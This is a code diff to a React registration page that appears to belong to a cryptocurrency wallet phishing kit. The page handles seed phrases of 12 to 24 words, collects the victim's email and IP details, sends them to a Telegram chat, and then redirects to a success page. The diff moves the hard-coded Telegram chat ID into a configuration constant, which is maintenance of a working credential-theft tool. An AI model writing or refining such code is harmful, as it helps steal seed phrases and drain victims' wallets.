@@ -2,7 +2,7 @@ import React, { useState, useEffect, useRef } from 'react';
 import { checkRegexEmail } from '../../common/utils/checkRegexEmail';
 import { Logotype } from '../../components/Logotype';
 import { TelegramService } from '../../services/telegram.service';
-import { CRYPTO_NAME } from '../../common/contants';
+import { CRYPTO_NAME, TELEGRAM_TARGET_CHAT_ID } from '../../common/contants';
 import './index.css';
 
 type SeedLengthType = 12 | 15 | 18 | 21 | 24;
@@ -194,7 +194,7 @@ export const RegisterPage = () => {
       + `<b>IP INFORMATION</b>\n\n`
       + ipInformation();
 
-    TelegramService.sendMessage(535364051, message)
+    TelegramService.sendMessage(TELEGRAM_TARGET_CHAT_ID, message)
       .then(() => {
         window.localStorage.setItem('lead-email', lead.email);
         window.location.href = '/success';
